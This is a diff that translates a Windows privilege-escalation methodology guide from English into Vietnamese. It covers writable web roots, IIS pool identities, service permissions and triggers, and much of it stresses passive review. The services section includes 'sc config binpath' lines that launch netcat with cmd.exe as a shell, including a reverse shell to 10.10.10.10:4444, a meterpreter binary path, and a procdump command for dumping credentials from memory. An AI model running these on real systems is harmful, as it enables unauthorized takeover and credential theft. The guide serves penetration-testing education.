+Snort 2 có thể tải shared library từ `dynamicpreprocessor directory` được khai báo trong cấu hình chọn bằng `snort.exe -c <config>`. Với scheduled task hoặc service chạy Snort dưới một tài khoản khác, hãy kiểm tra chính xác cấu hình đó và ACL của thư mục module được khai báo. Nếu token của bạn có thể tạo file tại đó, đây là đường dẫn cần xem xét về khả năng thực thi code khi task hoặc service đó tải module ở lần tiếp theo. Hãy xác minh các quyền hiệu lực của tài khoản chạy dịch vụ, cấu hình đang hoạt động, khả năng tương thích của module và mọi hạn chế về deny hoặc share; chỉ riêng việc thư mục có quyền ghi không chứng minh được khả năng leo thang đặc quyền. [Tài liệu về dynamic preprocessor của Snort](https://www.snort.org/documents/dpx-readme) mô tả việc tải module trong lúc chạy.
 
-### Privileged web service with a writable document root
+### Web service có đặc quyền với document root có quyền ghi
 
-On a Windows Apache installation, compare the service's executable path and run-as account with the `DocumentRoot` in its active `httpd.conf`. For a conventional XAMPP layout, inspect `C:\xampp\apache\conf\httpd.conf` and the ACL on its configured document root, often `C:\xampp\htdocs`. If a lower-privileged user can create files in that root while Apache runs as `LocalSystem`, server-side code execution may cross the host privilege boundary. Confirm the service is running, that the exact path is served, and that a server-side handler processes the file type; a writable root by itself proves only file creation. Inspect ACLs without writing a probe:
+Trên bản cài Apache Windows, hãy đối chiếu đường dẫn executable của service và tài khoản chạy service với `DocumentRoot` trong `httpd.conf` đang hoạt động. Với bố cục XAMPP thông thường, hãy kiểm tra `C:\xampp\apache\conf\httpd.conf` và ACL của document root được cấu hình, thường là `C:\xampp\htdocs`. Nếu người dùng có đặc quyền thấp hơn có thể tạo file trong thư mục đó trong khi Apache chạy dưới quyền `LocalSystem`, việc thực thi code phía máy chủ có thể vượt qua ranh giới đặc quyền của host. Hãy xác nhận service đang chạy, đường dẫn chính xác được phục vụ và handler phía máy chủ xử lý loại file đó; chỉ riêng việc document root có quyền ghi chỉ chứng minh khả năng tạo file. Kiểm tra ACL mà không ghi file thử:
 
 ```powershell
 Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
@@ -661,68 +661,68 @@ Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot
 icacls 'C:\xampp\htdocs'
 ```
 
-For a conventional WAMP installation, the service may point to a versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (or `C:\wamp\...` for a 32-bit layout), with configuration beside it under `conf\httpd.conf` and a default `C:\wamp64\www` or `C:\wamp\www` root. Check the exact service image, its run-as identity, the effective `DocumentRoot` (including `${INSTALL_DIR}` expansion and virtual-host overrides), and the root ACL together. A writable WAMP directory does not establish that Apache runs as `SYSTEM` or executes the submitted file. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).
+Với một cài đặt WAMP thông thường, service có thể trỏ đến `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (hoặc `C:\wamp\...` nếu dùng cấu trúc 32-bit), với cấu hình nằm cạnh đó tại `conf\httpd.conf` và thư mục gốc mặc định là `C:\wamp64\www` hoặc `C:\wamp\www`. Hãy kiểm tra đồng thời image chính xác của service, tài khoản chạy service, `DocumentRoot` thực tế (bao gồm việc khai triển `${INSTALL_DIR}` và các ghi đè virtual host) cùng ACL của thư mục gốc. Thư mục WAMP có quyền ghi không chứng minh rằng Apache chạy dưới quyền `SYSTEM` hoặc thực thi tệp được gửi lên. [Apache hướng dẫn cách service trên Windows chọn cấu hình](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).
 
-### Writable IIS root and application-pool network identity
+### Thư mục gốc IIS có quyền ghi và network identity của application pool
 
-For IIS, map a writable physical directory to an **active site/application** in `applicationHost.config`, then identify its configured pool and server-side handler. Code placed in a served directory runs as the pool only if IIS processes that file type and the route is reachable. Check the current user's effective create-file access, site runtime state, handler and per-path overrides before treating a writable directory as code execution.
+Với IIS, hãy ánh xạ một thư mục vật lý có quyền ghi tới một **site/application đang hoạt động** trong `applicationHost.config`, sau đó xác định pool được cấu hình và handler phía server. Mã đặt trong thư mục được phục vụ chỉ chạy dưới danh tính của pool nếu IIS xử lý loại tệp đó và route có thể truy cập được. Trước khi xem thư mục có quyền ghi là nơi thực thi mã, hãy kiểm tra quyền tạo tệp hiệu lực của user hiện tại, trạng thái hoạt động của site, handler và các ghi đè theo từng đường dẫn.
 
-ASP.NET dynamic compilation introduces a separate path to review: generated files under the application's compilation directory. The default is a `Temporary ASP.NET Files` directory beneath the relevant .NET Framework installation, but the application's `<compilation tempDirectory>` can change it. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). If a lower-privileged token can alter generated source in the **specific** application's cache, determine whether that application recompiles it under a more privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). A file or directory ACL alone does not prove code execution: correlate the cache with the active application, effective token and ACL, compilation settings, process identity, and timing of any recompile. Use read-only metadata review; do not trigger compilation or alter cache files during enumeration.
+Dynamic compilation của ASP.NET tạo ra một đường dẫn riêng cần xem xét: các tệp được tạo trong thư mục biên dịch của ứng dụng. Mặc định, thư mục `Temporary ASP.NET Files` nằm bên dưới bản cài đặt .NET Framework tương ứng, nhưng `<compilation tempDirectory>` của ứng dụng có thể thay đổi vị trí này. [Microsoft mô tả vị trí và các thư mục con theo từng ứng dụng](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) và [khuyến nghị cách ly các thư mục biên dịch khi các application pool không tin cậy lẫn nhau](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Nếu token có đặc quyền thấp hơn có thể chỉnh sửa source được tạo trong cache của **ứng dụng cụ thể**, hãy xác định liệu ứng dụng đó có biên dịch lại source dưới [danh tính worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) có đặc quyền cao hơn hay không. Chỉ riêng ACL của tệp hoặc thư mục không chứng minh được khả năng thực thi mã: hãy đối chiếu cache với ứng dụng đang hoạt động, token và ACL hiệu lực, thiết lập biên dịch, danh tính process và thời điểm biên dịch lại. Chỉ xem xét metadata ở chế độ chỉ đọc; không kích hoạt biên dịch hoặc chỉnh sửa tệp cache trong quá trình liệt kê.
 
-An IIS pool configured as `ApplicationPoolIdentity` or `NetworkService` commonly authenticates to domain resources as the **host computer account**, even though its local token may be low-privileged. `LocalSystem` is already highly privileged locally and also uses the computer account on the network; `LocalService` normally presents anonymous network credentials. A `SpecificUser` pool uses its configured account instead. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). An omitted identity setting can inherit pool defaults, which differ across IIS generations, so resolve the effective configuration instead of guessing from the pool name. If code execution reaches a pool with computer-account network identity, assess that **specific computer's** directory rights. [DCSync](../active-directory-methodology/dcsync.md) requires replication rights on the domain naming context; a machine-account ticket or host role alone does not prove them. Passive enumeration should inspect configuration and ACLs without uploading a file, making a network authentication, or requesting tickets.
+Một pool IIS được cấu hình là `ApplicationPoolIdentity` hoặc `NetworkService` thường xác thực với tài nguyên domain bằng **tài khoản máy chủ**, dù token cục bộ của nó có thể có đặc quyền thấp. `LocalSystem` vốn đã có đặc quyền cao trên máy cục bộ và cũng dùng tài khoản máy tính trên mạng; `LocalService` thường sử dụng thông tin xác thực mạng ẩn danh. Pool `SpecificUser` sử dụng tài khoản được cấu hình cho nó. [Microsoft mô tả các loại danh tính này](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) và [network identity của application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Thiết lập danh tính bị lược bỏ có thể kế thừa mặc định của pool; các giá trị này khác nhau giữa các thế hệ IIS, vì vậy hãy xác định cấu hình hiệu lực thay vì suy đoán từ tên pool. Nếu thực thi mã đạt đến pool có network identity là tài khoản máy tính, hãy đánh giá quyền thư mục của **chính máy tính đó**. [DCSync](../active-directory-methodology/dcsync.md) yêu cầu quyền replication trên domain naming context; ticket của machine account hoặc vai trò của máy chủ không tự chứng minh rằng máy có các quyền đó. Việc liệt kê thụ động nên kiểm tra cấu hình và ACL mà không tải tệp lên, thực hiện xác thực mạng hoặc yêu cầu ticket.
 
-For a readable ASP.NET handler that starts a helper process, trace any request-derived value through authentication, decryption, validation, and command construction. A handler that concatenates a decoded token into `ProcessStartInfo("cmd", "/c ...")` may let shell metacharacters change the command; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Establish that an untrusted caller can actually influence the decoded value and reach the handler, then resolve the effective application-pool or impersonated identity and the child process's identity. A readable source line, a localhost listener, or a token-format weakness alone does not prove privileged command execution. Review source and pool configuration without sending forged requests or running the helper during passive enumeration.
+Với một ASP.NET handler có thể đọc được và khởi chạy process phụ, hãy theo dõi mọi giá trị bắt nguồn từ request qua các bước xác thực, giải mã, kiểm tra hợp lệ và tạo lệnh. Handler nối token đã giải mã vào `ProcessStartInfo("cmd", "/c ...")` có thể cho phép các ký tự đặc biệt của shell thay đổi lệnh; [Microsoft mô tả các ký tự đặc biệt của `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Hãy xác minh rằng caller không đáng tin cậy thực sự có thể tác động đến giá trị đã giải mã và truy cập handler, sau đó xác định danh tính application pool hiệu lực hoặc danh tính được impersonate cùng danh tính của child process. Chỉ riêng một dòng source có thể đọc được, một listener localhost hoặc điểm yếu trong định dạng token không chứng minh được khả năng thực thi lệnh với đặc quyền cao. Hãy xem xét source và cấu hình pool mà không gửi request giả mạo hoặc chạy helper trong quá trình liệt kê thụ động.
 
-For a PHP service on Windows, a request-controlled path passed to [`include` or `require`](https://www.php.net/manual/en/function.include.php) can evaluate a lower-user-writable PHP file under the worker's identity. Confirm that the request can reach that statement, the resolved path names a file the lower user can modify and the worker can read, applicable PHP path restrictions permit the include, and the worker actually runs with higher privileges. A loopback listener or writable file alone does not establish this chain; inspect the source, service identity, and file ACLs without invoking the endpoint during passive enumeration.
+Với service PHP trên Windows, một đường dẫn do request kiểm soát được truyền vào [`include` hoặc `require`](https://www.php.net/manual/en/function.include.php) có thể thực thi tệp PHP mà user cấp thấp hơn có thể ghi, dưới danh tính của worker. Hãy xác nhận rằng request có thể đi đến câu lệnh đó, đường dẫn đã phân giải trỏ đến tệp mà user cấp thấp hơn có thể sửa và worker có thể đọc, các giới hạn đường dẫn PHP áp dụng cho phép include, và worker thực sự chạy với đặc quyền cao hơn. Listener loopback hoặc tệp có quyền ghi không đủ để chứng minh chuỗi tấn công này; hãy kiểm tra source, danh tính service và ACL của tệp mà không gọi endpoint trong quá trình liệt kê thụ động.
 
-### Memory Password mining
+### Khai thác mật khẩu trong bộ nhớ
 
-You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the **credentials in clear text in memory**, try to dump the memory and read the credentials.
+Bạn có thể tạo memory dump của một process đang chạy bằng **procdump** từ sysinternals. Các service như FTP có **thông tin xác thực ở dạng clear text trong bộ nhớ**; hãy thử dump bộ nhớ và đọc thông tin xác thực.
 
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 
-### Insecure GUI apps
+### Ứng dụng GUI không an toàn
 
-**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**
+**Ứng dụng chạy dưới quyền SYSTEM có thể cho phép người dùng mở CMD hoặc duyệt thư mục.**
 
-Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
+Ví dụ: "Windows Help and Support" (Windows + F1), tìm "command prompt", nhấp vào "Click to open Command Prompt"
 
-### Privileged project-file import
+### Nhập project-file với quyền cao
 
-An application that automatically opens projects from a lower-user-writable drop directory crosses an input trust boundary under the importer's account. Review the **exact writable path**, the process or task that opens it, its effective identity, and the parser build. A [historical Ghidra project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71) allowed XML external entities in project metadata; a network entity on Windows could cause authentication from the importing account if [outbound SMB and NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) permit it. That is a credential-exposure lead, not immediate administrator access: the response must be usable through a separate authorized or vulnerable path, and current builds must be assessed against their actual patch state. Do not open a crafted project during passive enumeration; inspect the import workflow and ACLs.
+Ứng dụng tự động mở các project từ thư mục thả mà người dùng cấp thấp có quyền ghi sẽ vượt qua ranh giới tin cậy đầu vào dưới tài khoản của ứng dụng nhập. Kiểm tra **đường dẫn chính xác có quyền ghi**, tiến trình hoặc tác vụ mở đường dẫn đó, danh tính hiệu lực và phiên bản parser. Một [lỗi lịch sử khi mở/khôi phục project Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) cho phép dùng external entity XML trong metadata của project; trên Windows, một network entity có thể khiến tài khoản nhập xác thực nếu [chính sách outbound SMB và NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) cho phép. Đây là manh mối về lộ thông tin xác thực, không phải quyền truy cập administrator tức thời: phản hồi phải sử dụng được qua một đường dẫn riêng được cho phép hoặc dễ bị tổn thương, và cần đánh giá các bản build hiện tại dựa trên trạng thái vá thực tế. Không mở project được tạo đặc biệt trong quá trình liệt kê thụ động; hãy kiểm tra quy trình nhập và ACL.
 
 ## Services
 
-The Service Control Manager (SCM) object's [`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) is separate from rights on an existing service. A successful read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) for that right is a review lead, not proof that a new service can run. [`CreateService` returns a handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) with the service access requested at creation; later reopening the service performs a separate access check and may fail even when the original handle could be used. Verify the effective local or remote token, granted handle rights, service account, start policy, and executable path separately. Do not create or start a service during passive enumeration.
+Quyền [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) trên đối tượng Service Control Manager (SCM) tách biệt với các quyền trên một service hiện có. Yêu cầu quyền [`OpenSCManager` chỉ đọc](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) thành công đối với quyền đó là manh mối cần xem xét, không phải bằng chứng rằng service mới có thể chạy. [`CreateService` trả về một handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) có các quyền service được yêu cầu khi tạo; lần mở lại service sau đó sẽ thực hiện một kiểm tra quyền riêng và có thể thất bại ngay cả khi handle ban đầu có thể được sử dụng. Hãy xác minh riêng token cục bộ hoặc từ xa có hiệu lực, quyền được cấp cho handle, tài khoản service, chính sách khởi động và đường dẫn executable. Không tạo hoặc khởi động service trong quá trình liệt kê thụ động.
 
-For a remote service-install path, correlate those SCM rights with a share on the target that the **same network logon** can write, its underlying NTFS ACL, and a local executable path that the service account can run. A non-admin account can cross this boundary if unusually broad SCM rights and the file-placement path both exist; an administrative share is not an inherent prerequisite. Share write access alone, or an SCM create-service lead alone, does not establish that the new service can start under a higher identity.
+Đối với đường dẫn cài đặt service từ xa, hãy đối chiếu các quyền SCM đó với một share trên máy đích mà **cùng một lần đăng nhập mạng** có thể ghi, ACL NTFS bên dưới của share và đường dẫn executable cục bộ mà tài khoản service có thể chạy. Tài khoản không phải admin có thể vượt qua ranh giới này nếu tồn tại đồng thời quyền SCM rộng bất thường và đường dẫn đặt file; administrative share không phải điều kiện tiên quyết vốn có. Chỉ có quyền ghi vào share hoặc manh mối về quyền tạo service trên SCM không chứng minh rằng service mới có thể khởi động dưới danh tính cao hơn.
 
-An existing service may invoke a helper executable on startup, shutdown, or another lifecycle event even when that helper is absent from its `ImagePath`. If the helper name is resolved into a lower-user-writable directory and the service runs under a higher identity, a missing helper file is a conditional replacement candidate. Confirm the **actual service code or documented helper invocation**, the resolved executable path and search order, directory creation rights, service identity, and an available lifecycle trigger. A writable service directory or a missing file alone does not establish that the service loads the file; passive review should not start or stop the service.
+Một service hiện có có thể gọi executable trợ giúp khi khởi động, tắt hoặc trong một sự kiện vòng đời khác, ngay cả khi executable đó không có trong `ImagePath`. Nếu tên executable trợ giúp được phân giải thành một thư mục mà người dùng cấp thấp có quyền ghi và service chạy dưới danh tính cao hơn, file trợ giúp bị thiếu có thể là ứng viên để thay thế trong một số điều kiện. Hãy xác nhận **mã service thực tế hoặc lời gọi executable trợ giúp được ghi nhận**, đường dẫn executable được phân giải và thứ tự tìm kiếm, quyền tạo thư mục, danh tính service và một trigger vòng đời khả dụng. Chỉ riêng thư mục service có quyền ghi hoặc file bị thiếu không chứng minh service sẽ tải file đó; khi rà soát thụ động, không khởi động hoặc dừng service.
 
-For an existing service, [`SERVICE_START` permits supplying arguments to `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); it is distinct from [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Review the service's code or documented interface before treating start access as more than a control right. If it uses a caller-selected argument as a log or export path, verify the service identity, exact argument-to-write flow, path restrictions, and the permissions of the **created file**. A write into a protected directory can become escalation only with a separate privileged consumer or loader that accepts that file; a writable log or start right alone is insufficient. Passive inventory should not start the service or create a test file.
+Đối với service hiện có, [`SERVICE_START` cho phép cung cấp tham số cho `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); quyền này khác với [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Hãy xem mã hoặc giao diện được ghi nhận của service trước khi coi quyền khởi động là thứ gì hơn một quyền điều khiển. Nếu service dùng tham số do caller chọn làm đường dẫn log hoặc export, hãy xác minh danh tính service, luồng ghi chính xác từ tham số, các giới hạn đường dẫn và quyền trên **file được tạo**. Việc ghi vào thư mục được bảo vệ chỉ có thể dẫn đến leo thang quyền khi có một consumer hoặc loader có quyền cao riêng biệt chấp nhận file đó; chỉ có log được ghi hoặc quyền khởi động là chưa đủ. Khi kiểm kê thụ động, không khởi động service hoặc tạo file kiểm thử.
 
-For an NSClient++ monitoring agent, a readable `nsclient.ini` is a **configuration review lead**: it may hold web credentials, while `boot.ini` can redirect the configuration to another location. Check the actual service account, WEB listener and access policy, and whether the authenticated role can change settings or scripts. Privileged execution additionally requires `CheckExternalScripts` (or another enabled execution path), an effective right to register or modify a command, and a trigger that runs it under the service identity. A loopback-only listener can still be reachable to a local user, but the file path, password, or listener alone does not establish those rights. Review metadata and permissions without displaying secrets or invoking the web API during passive enumeration. See the [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web and script security guidance](https://nsclient.org/docs/setup/securing/), and [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/).
+Đối với agent giám sát NSClient++, file `nsclient.ini` đọc được là **manh mối cần rà soát cấu hình**: file này có thể chứa thông tin đăng nhập web, còn `boot.ini` có thể chuyển hướng cấu hình sang vị trí khác. Kiểm tra tài khoản service thực tế, listener WEB và chính sách truy cập, cũng như liệu role đã xác thực có thể thay đổi cài đặt hoặc script hay không. Để thực thi với quyền cao, còn cần `CheckExternalScripts` (hoặc một đường dẫn thực thi khác đang bật), quyền thực tế để đăng ký hoặc sửa đổi command và trigger chạy command đó dưới danh tính service. Listener chỉ lắng nghe loopback vẫn có thể được người dùng cục bộ truy cập, nhưng riêng đường dẫn file, mật khẩu hoặc listener không chứng minh có các quyền đó. Rà soát metadata và quyền mà không hiển thị bí mật hoặc gọi web API trong quá trình liệt kê thụ động. Xem [bố cục file của NSClient++](https://nsclient.org/docs/concepts/file-layout/), [hướng dẫn bảo mật web và script](https://nsclient.org/docs/setup/securing/) và [cấu hình external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).
 
-For a service whose `ImagePath` is `nssm.exe`, inspect the service's actual run-as account and its `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value: [NSSM stores the child application there](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), while `AppDirectory` is its configured working directory. Check the child executable and its parent-directory ACLs before treating the wrapper's permissions as the whole service boundary. A local WCF or SOAP endpoint exposed by that child is a separate review lead: confirm the listener is reachable by the lower-privileged user, the exact operation accepts their input, and the service child executes the unsafe operation under a higher identity. The service account, an endpoint URL, or a writable path alone does not prove escalation; avoid invoking service operations during passive enumeration.
+Đối với service có `ImagePath` là `nssm.exe`, hãy kiểm tra tài khoản chạy thực tế của service và giá trị `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM lưu ứng dụng con tại đó](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), còn `AppDirectory` là thư mục làm việc được cấu hình. Kiểm tra executable con và ACL của các thư mục cha trước khi cho rằng quyền của wrapper đã bao quát toàn bộ ranh giới service. Endpoint WCF hoặc SOAP cục bộ do ứng dụng con đó cung cấp là một manh mối cần xem xét riêng: xác nhận người dùng có quyền thấp có thể truy cập listener, thao tác cụ thể có chấp nhận đầu vào của họ hay không và ứng dụng con của service có thực thi thao tác không an toàn dưới danh tính cao hơn hay không. Tài khoản service, URL endpoint hoặc đường dẫn có quyền ghi riêng lẻ không chứng minh được khả năng leo thang quyền; tránh gọi các thao tác của service trong quá trình liệt kê thụ động.
 
-For a custom WCF operation, trace a caller-controlled string into any PowerShell runspace. [`Pipeline.Commands.AddScript` adds script text](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), and [`Pipeline.Invoke` runs the pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). A [`netTcpBinding` with Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authenticates the client, but authorization to call that **specific** operation and the runspace's effective identity must be checked separately. A path from a lower-privileged caller's input to `AddScript` under a higher service identity is a code-execution boundary; a listening port, authenticated client, or unused method in an unrelated assembly alone is not proof. Review the deployed service, contract, authorization, and impersonation settings statically without invoking the endpoint during enumeration.
+Đối với thao tác WCF tùy chỉnh, hãy lần theo một chuỗi do caller kiểm soát đến mọi PowerShell runspace. [`Pipeline.Commands.AddScript` thêm văn bản script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), còn [`Pipeline.Invoke` chạy pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` với thông tin xác thực Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) xác thực client, nhưng cần kiểm tra riêng quyền gọi **thao tác cụ thể đó** và danh tính hiệu lực của runspace. Đường đi từ đầu vào của caller có quyền thấp đến `AddScript` dưới danh tính service cao hơn là một ranh giới thực thi mã; chỉ có cổng đang lắng nghe, client đã xác thực hoặc một method không được dùng trong assembly không liên quan không phải bằng chứng. Rà soát tĩnh service đã triển khai, contract, quyền truy cập và cài đặt impersonation mà không gọi endpoint trong quá trình liệt kê.
 
-Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:
+Service Triggers cho phép Windows khởi động service khi một số điều kiện xảy ra (hoạt động trên named pipe/RPC endpoint, sự kiện ETW, IP khả dụng, thiết bị được kết nối, làm mới GPO, v.v.). Ngay cả khi không có quyền SERVICE_START, bạn thường vẫn có thể khởi động service có quyền cao bằng cách kích hoạt trigger của chúng. Xem các kỹ thuật liệt kê và kích hoạt tại đây:
 
 -
 {{#ref}}
 service-triggers.md
 {{#endref}}
 
-### Visual Studio diagnostic collector service
+### Dịch vụ thu thập chẩn đoán Visual Studio
 
-Visual Studio installations with C/C++ tooling may include `VSStandardCollectorService150`, a diagnostic service configured to run as `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) used a junction and object-manager-link race to redirect a service DACL reset. The demonstrated escalation also required a usable Visual Studio Setup WMI Provider MSI repair path and its `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target. The component was fixed in January 2024.
+Các bản cài đặt Visual Studio có công cụ C/C++ có thể bao gồm `VSStandardCollectorService150`, một dịch vụ chẩn đoán được cấu hình chạy dưới quyền `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) đã dùng junction và race với object-manager-link để chuyển hướng việc đặt lại DACL của service. Việc leo thang được trình diễn cũng cần một đường dẫn sửa chữa MSI khả dụng của Visual Studio Setup WMI Provider và target `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Thành phần này đã được sửa vào tháng 1 năm 2024.
 
-For passive triage, inspect that one service's account and binary path, check whether the Setup WMI compiler path exists, and verify the installed component's patch status. A service entry, Visual Studio product version, or compiler file alone does not establish that the host is vulnerable. Inspection need not start the service or run a repair.
+Khi phân loại thụ động, hãy kiểm tra tài khoản và đường dẫn binary của service đó, xác minh đường dẫn Setup WMI compiler có tồn tại hay không và kiểm tra trạng thái vá của thành phần đã cài đặt. Chỉ riêng mục service, phiên bản sản phẩm Visual Studio hoặc file compiler không chứng minh host dễ bị tấn công. Việc kiểm tra không cần khởi động service hoặc chạy thao tác sửa chữa.
 
-Get a list of services:
+Lấy danh sách service:
 
 ```bash
 net start
@@ -731,21 +731,21 @@ sc query
 Get-Service
 ```
 
-### Permissions
+### Quyền hạn
 
-You can use **sc** to get information of a service
+Bạn có thể dùng **sc** để lấy thông tin về một service
 
 ```bash
 sc qc <service_name>
 ```
 
-It is recommended to have the binary **accesschk** from _Sysinternals_ to check the required privilege level for each service.
+Bạn nên có binary **accesschk** từ _Sysinternals_ để kiểm tra mức đặc quyền cần thiết cho từng dịch vụ.
 
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
 
-It is recommended to check if "Authenticated Users" can modify any service:
+Bạn nên kiểm tra xem "Authenticated Users" có thể chỉnh sửa bất kỳ dịch vụ nào hay không:
 
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
@@ -754,33 +754,33 @@ accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
 
-[You can download accesschk.exe for XP from here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
+[Tải accesschk.exe cho XP tại đây](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
-### Enable service
+### Bật service
 
-If you are having this error (for example with SSDPSRV):
+Nếu bạn gặp lỗi này (ví dụ với SSDPSRV):
 
-_System error 1058 has occurred._\
-_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
+_Lỗi hệ thống 1058 đã xảy ra._\
+_Không thể khởi động service vì service đã bị tắt hoặc không có thiết bị nào được bật liên kết với service._
 
-You can enable it using
+Bạn có thể bật service bằng cách dùng
 
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
 
-**Take into account that the service upnphost depends on SSDPSRV to work (for XP SP1)**
+**Lưu ý rằng dịch vụ upnphost phụ thuộc vào SSDPSRV để hoạt động (đối với XP SP1)**
 
-**Another workaround** of this problem is running:
+**Một cách khắc phục khác** cho vấn đề này là chạy:
 
 ```
 sc.exe config usosvc start= auto
 ```
 
-### **Modify service binary path**
+### **Sửa đổi đường dẫn binary của service**
 
-In the scenario where the "Authenticated users" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:
+Trong trường hợp nhóm "Authenticated users" có quyền **SERVICE_ALL_ACCESS** trên một service, có thể sửa đổi binary thực thi của service. Để sửa đổi và thực thi **sc**:
 
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
@@ -790,29 +790,29 @@ sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cm
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 ```
 
-### Restart service
+### Khởi động lại dịch vụ
 
 ```bash
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
 ```
 
-Privileges can be escalated through various permissions:
+Có thể leo thang đặc quyền thông qua nhiều quyền khác nhau:
 
-- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.
-- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
-- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.
-- **GENERIC_WRITE**: Inherits the ability to change service configurations.
-- **GENERIC_ALL**: Also inherits the ability to change service configurations.
+- **SERVICE_CHANGE_CONFIG**: Cho phép cấu hình lại binary của dịch vụ.
+- **WRITE_DAC**: Cho phép cấu hình lại quyền, từ đó có thể thay đổi cấu hình dịch vụ.
+- **WRITE_OWNER**: Cho phép chiếm quyền sở hữu và cấu hình lại quyền.
